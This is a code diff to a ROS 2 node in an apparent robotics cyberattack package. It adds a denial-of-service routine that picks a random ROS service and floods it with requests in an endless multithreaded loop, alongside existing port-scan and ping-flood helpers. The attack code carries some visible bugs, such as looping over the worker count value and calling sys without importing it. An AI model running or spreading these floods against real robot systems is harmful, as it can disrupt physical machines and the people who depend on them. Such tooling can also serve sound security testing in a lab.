@@ -5,9 +5,11 @@ from std_srvs.srv import Empty
 from rcl_interfaces.srv import GetParameters
 from ros2node.api import get_node_names
 from roboticpark_cyberattacks.dosattack_scan import scan_tcp_ports, scan_udp_ports
+from rcl_interfaces.srv import *
 import random, socket
 from ping3 import ping
 import concurrent.futures
+import importlib
 
 class dosnode(Node):
     def __init__(self):
@@ -86,6 +88,30 @@ def dosSendPingAux(ip):
         except Exception as e:
             print(f"Error: {e}")
 
+def dosFillService(mydosnode,nodeObjectiveServer,nodeObjectiveType,workers):
+    moduleName, class_name = nodeObjectiveType.rsplit('/', 1)
+    moduleName = moduleName.replace('/', '.')
+    module = importlib.import_module(moduleName)
+    dosObjectiveClass = getattr(module, class_name)
+    futures = []
+
+    # Configure request
+    sclient = mydosnode.create_client(dosObjectiveClass,nodeObjectiveServer)
+    while not sclient.wait_for_service(timeout_sec=1.0):
+        mydosnode.get_logger().info(f'service {mydosnode} not available, waiting again...')
+    request = dosObjectiveClass.Request()
+
+    while True:
+        print(nodeObjectiveServer)
+        with concurrent.futures.ThreadPoolExecutor(max_workers=int(workers)) as executor:
+            for _ in workers:
+                futures.append(executor.submit(dosFillServiceAux,sclient=sclient,request=request))
+
+def dosFillServiceAux(sclient,request):
+    future = sclient.call_async(request)
+    print(future.result())
+
+
 def main():
     rclpy.init()
     mydosnode = dosnode()
@@ -96,12 +122,24 @@ def main():
     dostype = mydosnode.get_parameter('dos_type')._value
     dosprotocol = mydosnode.get_parameter('dos_protocol')._value
     dospingworkers = mydosnode.get_parameter('dos_ping_workers')._value
+    dosnodename = mydosnode.get_parameter('dos_node_objective')._value
     portrange = range(1, 65535)  # Escanea los puertos del 1 al 1024
 
     if ipobjectiveParam == 'Unset':
         checkService(mydosnode)
-        mydosnode.get_logger().info(f'We try to fill any of the topics:  {dostype} was chosen')
+        mydosnode.get_logger().info(f'We try to fill any of the services:  {dosnodename} was chosen')
+        nodeParamList = mydosnode.get_service_names_and_types()
 
+        # We choose a random service
+        nodeParam = random.choice(nodeParamList)
+        try:
+            nodeObjectiveServer = nodeParam[0]
+            nodeObjectiveType = nodeParam[1][0]
+            print(f'Servicio {nodeObjectiveServer} Tipo de parámetro {nodeObjectiveType}')
+            dosFillService(mydosnode,nodeObjectiveServer,nodeObjectiveType,dospingworkers)
+        except Exception as e:
+            print(f'No service available in this node {e}')
+            sys.exit()
 
 
     else:
